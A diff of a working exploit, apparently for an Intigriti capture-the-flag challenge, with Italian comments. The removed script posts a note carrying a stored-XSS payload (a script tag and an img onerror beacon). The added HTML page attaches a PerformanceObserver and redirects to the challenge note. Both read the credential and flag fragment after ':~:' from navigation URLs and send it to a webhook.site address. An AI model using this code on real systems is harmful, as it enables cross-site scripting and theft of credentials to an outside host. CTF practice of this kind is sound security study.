@@ -1,144 +1,132 @@
-(async () => {
-  console.log("Tentativo nota V19 CON PASSWORD (PerfObserver + Log Ingresso Callback)...");
-  try {
-    const WEBHOOK = 'https://webhook.site/ec2c1762-e345-4cd3-b76a-7c8482efe72d'; // Il tuo webhook
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Observer Page</title>
+</head>
+<body>
+    <p>Observer Active. Please wait...</p>
 
-    // Payload V19 - Aggiunge log all'inizio della callback (INVARIATO)
-    const perfObserverPayloadV19 = `
-      <script>
+    <script>
+        // --- CONFIGURAZIONE ---
+        const WEBHOOK = 'https://webhook.site/ec2c1762-e345-4cd3-b76a-7c8482efe72d'; // Il tuo webhook
+        // URL del challenge che attiva il middleware (usa un UUID fittizio ma valido nel formato)
+        const CHALLENGE_NOTE_URL = 'https://challenge-0325.intigriti.io/note/11111111-1111-1111-1111-111111111111';
+        // --------------------
+
         let flagFound = false;
-        let callbackEntered = false; // Nuovo flag
 
+        // Funzione per inviare dati al webhook
         function send(params) {
-          try {
-            for (const key in params) {
-              if (typeof params[key] === 'string' && params[key].length > 500) {
-                params[key] = params[key].substring(0, 497) + '...';
-              }
+            if (!WEBHOOK || WEBHOOK === 'IL_TUO_WEBHOOK_URL') {
+                console.error("ERRORE: URL Webhook non configurato!");
+                return;
             }
-            const queryString = Object.keys(params).map(key => key + '=' + encodeURIComponent(params[key])).join('&');
-            new Image().src = '${WEBHOOK}?' + queryString;
-            console.log('V19 Sent:', params);
-          } catch (e) { console.error('V19 Send Error:', e); }
+            try {
+                // Tronca parametri lunghi per sicurezza
+                for (const key in params) {
+                    if (typeof params[key] === 'string' && params[key].length > 500) {
+                        params[key] = params[key].substring(0, 497) + '...';
+                    }
+                }
+                const queryString = Object.keys(params).map(key => key + '=' + encodeURIComponent(params[key])).join('&');
+                new Image().src = WEBHOOK + '?' + queryString;
+                console.log('Webhook Sent:', params);
+            } catch (e) {
+                console.error('Webhook Send Error:', e);
+                // Prova a inviare l'errore stesso
+                try {
+                    new Image().src = WEBHOOK + '?error=send_func_error&message=' + encodeURIComponent(e.message);
+                } catch (e2) { /* Ignora errore nell'invio dell'errore */ }
+            }
         }
 
+        // Inizio script principale
         try {
-          send({ status: 'v19_script_started' });
+            send({ status: 'observer_page_loaded', ts: Date.now() });
 
-          const observer = new PerformanceObserver((list) => {
-             // --- NUOVO LOG IMMEDIATO ---
-             if (!callbackEntered) {
-                 callbackEntered = true; // Segna che siamo entrati almeno una volta
-                 send({ status: 'v19_OBSERVER_CALLBACK_ENTERED', entry_count: list.getEntries().length });
-             }
-             // --- FINE NUOVO LOG ---
-
-            if (flagFound) return;
-
-            list.getEntries().forEach((entry) => {
-              if (flagFound) return;
-
-              // Invia più dettagli sull'entry per debug
-              send({ status: 'v19_processing_entry', type: entry.entryType, name_len: entry.name?.length || 0 });
-
-
-              if (entry.entryType === 'navigation') { // Usa entryType invece di type
-                const navigationUrl = entry.name;
-                send({ status: 'v19_nav_entry_processing', url: navigationUrl }); // Log URL trovato
-
-                if (navigationUrl && navigationUrl.includes(':~:')) {
-                  const hashPartIndex = navigationUrl.indexOf(':~:');
-                  send({ status: 'v19_found_hashpart_in_nav_url', index: hashPartIndex });
-
-                  const secretData = navigationUrl.substring(hashPartIndex + 3);
-                  const colonIndex = secretData.indexOf(':');
-
-                  if (colonIndex !== -1) {
-                    const flag = secretData.substring(colonIndex + 1);
-                    send({ flag_final_v19: flag, source: 'perf_observer_nav_url' });
-                    flagFound = true;
-                    observer.disconnect();
-                  } else {
-                    send({ error: 'v19_no_colon_in_nav_url_data', data: secretData });
-                    flagFound = true;
-                    observer.disconnect();
-                  }
-                } else {
-                   send({ status: 'v19_no_hashpart_in_nav_url', url_len: navigationUrl.length });
+            const observer = new PerformanceObserver((list) => {
+                if (flagFound) {
+                    console.log("Observer callback: Flag già trovata, ignoro.");
+                    return;
                 }
-              } else {
-                  // Ignora altri tipi
-                  // send({ status: 'v19_ignoring_entry', type: entry.entryType });
-              }
-            });
-          });
+                send({ status: 'observer_callback_entered', entry_count: list.getEntries().length });
 
-          observer.observe({ entryTypes: ['navigation'], buffered: true }); // Usa entryTypes (più moderno)
-          send({ status: 'v19_observer_attached' });
+                list.getEntries().forEach((entry) => {
+                    if (flagFound) return;
+
+                    // Cerchiamo specificamente un evento di navigazione che contenga il fragment anomalo
+                    // Questo dovrebbe corrispondere al redirect fatto dal middleware del challenge
+                    if (entry.entryType === 'navigation' && entry.name && entry.name.includes(':~:')) {
+                        send({ status: 'nav_entry_potential_leak', url_preview: entry.name.substring(0, 150), ts: Date.now() });
+
+                        try {
+                            // Decodifica l'URL (potrebbe contenere % encoding)
+                            const decodedUrl = decodeURIComponent(entry.name);
+                            send({ status: 'decoded_url_attempt', decoded_preview: decodedUrl.substring(0, 150) });
+
+                            // Splitta per trovare la parte dopo :~:
+                            const fragmentParts = decodedUrl.split(':~:');
+                            if (fragmentParts.length > 1) {
+                                const leakData = fragmentParts[1];
+                                send({ status: 'fragment_part_found', data: leakData });
+
+                                // Splitta per : per separare username e password/flag
+                                const credentialParts = leakData.split(':');
+                                if (credentialParts.length > 1) {
+                                    // La flag è la seconda parte (o tutto ciò che segue il primo :)
+                                    const potentialFlag = credentialParts.slice(1).join(':');
+                                    send({
+                                        status: 'FLAG_CAPTURED',
+                                        flag_final_observer: potentialFlag,
+                                        source: 'perf_observer_nav_url_decoded_split',
+                                        full_fragment: leakData,
+                                        ts: Date.now()
+                                    });
+                                    flagFound = true;
+                                    observer.disconnect(); // Trovata! Stop osservazione.
+                                    console.log("FLAG TROVATA E INVIATA!", potentialFlag);
+                                } else {
+                                    send({ error: 'fragment_format_unexpected_no_colon', data: leakData, ts: Date.now() });
+                                    flagFound = true; // Interrompi comunque se il formato non è atteso
+                                    observer.disconnect();
+                                }
+                            } else {
+                                send({ error: 'split_by_separator_yielded_no_fragment', decoded_url: decodedUrl, ts: Date.now() });
+                                flagFound = true; // Interrompi
+                                observer.disconnect();
+                            }
+                        } catch (e) {
+                            send({ error: 'decode_split_error', message: e.message, url: entry.name, ts: Date.now() });
+                            flagFound = true; // Interrompi in caso di errore critico
+                            observer.disconnect();
+                        }
+                    } else {
+                        // Logga altre entry di navigazione per debug, se necessario
+                         // send({ status: 'other_nav_entry', type: entry.entryType, name_preview: entry.name ? entry.name.substring(0,100) : 'N/A' });
+                    }
+                });
+            });
+
+            // Inizia ad osservare gli eventi di navigazione
+            observer.observe({ type: 'navigate', buffered: true });
+            // Alternativa: observer.observe({ entryTypes: ['navigation'], buffered: true });
+            send({ status: 'observer_attached', ts: Date.now() });
+            console.log("PerformanceObserver attached.");
+
+            // --- IL REDIRECT CRUCIALE ---
+            // Ora che l'observer è attivo, reindirizza il browser alla pagina del challenge
+            // Questo farà scattare il middleware del challenge e il conseguente redirect con la flag.
+            console.log("Redirecting to challenge URL:", CHALLENGE_NOTE_URL);
+            send({ status: 'redirecting_to_challenge', url: CHALLENGE_NOTE_URL, ts: Date.now() });
+            window.location.href = CHALLENGE_NOTE_URL;
 
         } catch (e) {
-          if (!flagFound && !callbackEntered) { // Invia errore solo se non siamo mai entrati nella callback
-            send({ error: 'v19_generic_catch', message: e.message });
-          } else if (!flagFound) {
-            // Errore dopo essere entrati nella callback ma prima di trovare la flag
-             send({ error: 'v19_generic_catch_inside_callback_maybe', message: e.message });
-          }
-        } finally {
-           send({ status: 'v19_script_finished_observer_waiting' });
+            // Gestione errori generici dello script della pagina observer
+            console.error("Errore nello script della pagina observer:", e);
+            send({ error: 'observer_page_main_catch', message: e.message, ts: Date.now() });
         }
-      <\/script>
-      <img src='/' onerror='new Image().src="${WEBHOOK}?status=v19_img_onerror";'>
-    `;
+    </script>
 
-    // --- MODIFICA RICHIESTA: Invio della richiesta POST con password ---
-    console.log("Invio richiesta per creare nota CON password...");
-    const response = await fetch("https://challenge-0325.intigriti.io/api/post", {
-      method: "POST",
-      // Usiamo gli header essenziali come nel tuo codice originale, principalmente Content-Type
-      headers: {
-          "Content-Type": "application/json",
-          "Accept": "*/*", // Aggiunto Accept per buona misura
-          // Nota: Non ho incluso tutti gli header specifici del browser (sec-ch-ua, etc.)
-          // dall'esempio che hai fornito, poiché potrebbero non essere necessari
-          // e il tuo codice originale non li usava. Se incontri problemi,
-          // potremmo doverli aggiungere.
-      },
-      body: JSON.stringify({
-        title: "PerfObserverDebug V19 PWD", // Titolo leggermente modificato per chiarezza
-        content: [ perfObserverPayloadV19 ], // Contenuto invariato
-        use_password: "true" // <-- MODIFICA CHIAVE: Imposta a true per usare la password
-      }),
-      // Non sono necessari referrerPolicy, cache-control, pragma, ecc. qui nel fetch JS,
-      // a meno che non sia specificamente richiesto dal server.
-    });
-    // --- FINE MODIFICA RICHIESTA ---
-
-    // --- Gestione Risposta (MODIFICATA per gestire la password) ---
-    if (!response.ok) {
-      const errorText = await response.text();
-      throw new Error(`HTTP error! status: ${response.status} ${errorText}`);
-    }
-    const data = await response.json();
-
-    // Ora ci aspettiamo che l'API restituisca anche 'password'
-    if (data.id && data.password) {
-        const noteUrl = "https://challenge-0325.intigriti.io/note/" + data.id;
-        console.log("Nota V19 CON PASSWORD creata! ID:", data.id, "Password:", data.password, "URL:", noteUrl);
-        // Aggiorna il prompt per mostrare anche la password
-        prompt(`Copia URL V19 e invialo al bot (PASSWORD: ${data.password}):`, noteUrl);
-    } else if (data.id) {
-         // Fallback nel caso l'API non restituisca la password come previsto
-         const noteUrl = "https://challenge-0325.intigriti.io/note/" + data.id;
-         console.warn("Nota V19 creata MA SENZA password restituita dall'API? ID:", data.id, "URL:", noteUrl);
-         prompt("Copia URL V19 e invialo al bot (Password non ricevuta?):", noteUrl);
-    } else {
-        // Nessun ID restituito
-        throw new Error("API did not return ID: " + (data.message || JSON.stringify(data)));
-    }
-
-  } catch (error) {
-      console.error("Errore nello script principale V19:", error);
-      // Potresti voler inviare un log di errore anche al webhook qui, se necessario
-      // new Image().src = `${WEBHOOK}?error=v19_main_script_catch&message=${encodeURIComponent(error.message)}`;
-  }
-})();
+</body>
+</html>
